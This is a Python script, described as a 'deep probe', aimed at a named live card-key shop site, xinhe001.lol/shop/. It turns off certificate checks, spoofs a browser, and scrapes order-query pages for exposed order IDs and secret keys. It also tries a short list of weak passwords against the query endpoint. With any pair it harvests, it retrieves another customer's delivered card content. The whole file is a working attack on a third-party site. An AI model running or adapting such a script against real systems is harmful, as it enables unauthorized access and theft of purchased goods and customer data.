#!/usr/bin/env python3
"""xinhe001.lol/shop/ deep probe."""
import json
import re
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)
CSRF = re.compile(r'csrf_token\s*=\s*"([^"]+)"')


def main():
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Referer": BASE})
    r = s.get(BASE, timeout=25)
    report = {
        "target": "xinhe001.lol",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "home_len": len(r.text),
        "rainbow": "assets/faka" in r.text,
        "csrf": CSRF.search(r.text).group(1)[:20] if CSRF.search(r.text) else None,
    }

    gc = s.get(BASE + "ajax.php?act=getcount", timeout=12)
    report["getcount"] = gc.text[:300]

    for name, params in [
        ("query", {"mod": "query"}),
        ("query_data1", {"mod": "query", "data": "1"}),
        ("query_data_empty", {"mod": "query", "data": ""}),
        ("query_page2", {"mod": "query", "page": "2"}),
    ]:
        rr = s.get(BASE, params=params, timeout=15)
        so = SHOW.findall(rr.text)
        fk = FAKA.findall(rr.text)
        report[name] = {
            "len": len(rr.text),
            "showOrder": len(so),
            "faka_links": len(fk),
            "sample": so[:5],
        }
        if so or fk:
            report["VULN_HINT"] = name

    tl = s.get(BASE + "toollogs.php", timeout=12)
    report["toollogs"] = {
        "len": len(tl.text),
        "showOrder": len(SHOW.findall(tl.text)),
        "snip": tl.text[:150],
    }

    # ajax query pwd
    for pwd in ["123456", "888888", "1", "666666", "xinhe", "xinghe001"]:
        qr = s.post(
            BASE + "ajax.php?act=query",
            data={"type": "1", "content": "1", "pwd": pwd},
            timeout=12,
        )
        if SHOW.search(qr.text) or "kminfo" in qr.text:
            report["pwd_hit"] = {"pwd": pwd, "resp": qr.text[:200]}
            break

    # test faka if we have pairs from query
    pairs = {}
    for m in SHOW.finditer(s.get(BASE, params={"mod": "query", "data": "1"}, timeout=15).text):
        pairs[m.group(1)] = m.group(2)
    for m in FAKA.finditer(s.get(BASE, params={"mod": "query", "data": "1"}, timeout=15).text):
        pairs[m.group(1)] = m.group(2)
    report["pairs_from_data1"] = len(pairs)
    if pairs:
        oid, skey = next(iter(pairs.items()))
        fk = s.get(BASE, params={"mod": "faka", "id": oid, "skey": skey}, timeout=15)
        m = CARD.search(fk.text)
        report["faka_sample"] = {
            "id": oid,
            "card": m.group(1)[:150] if m else fk.text[:100],
        }

    print(json.dumps(report, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
